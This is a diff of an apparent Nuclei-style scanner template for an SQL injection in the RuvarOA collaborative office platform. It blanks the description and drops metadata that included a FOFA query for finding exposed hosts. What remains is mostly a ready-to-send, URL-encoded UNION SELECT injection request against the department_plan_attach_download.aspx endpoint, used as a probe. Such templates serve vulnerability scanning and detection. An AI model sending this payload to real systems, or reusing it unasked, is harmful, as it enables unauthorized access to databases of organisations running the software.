@@ -3,12 +3,8 @@ info:
   name: RuvarOA协同办公平台-department_plan_attach_download-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lbxomg5k5qzzpxig'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lbxomg5k5qzzpxig
-    fofa: body="txt_admin_key"
 http:
 - raw:
   - 'GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%2872%29%2bCHAR%28101%29%2bCHAR%28108%29%2bCHAR%28108%29%2bCHAR%28111%29%2bCHAR%2832%29%2b%2bCHAR%2887%29%2bCHAR%28111%29%2bCHAR%28114%29%2bCHAR%28108%29%2bCHAR%28100%29%2bCHAR%2833%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
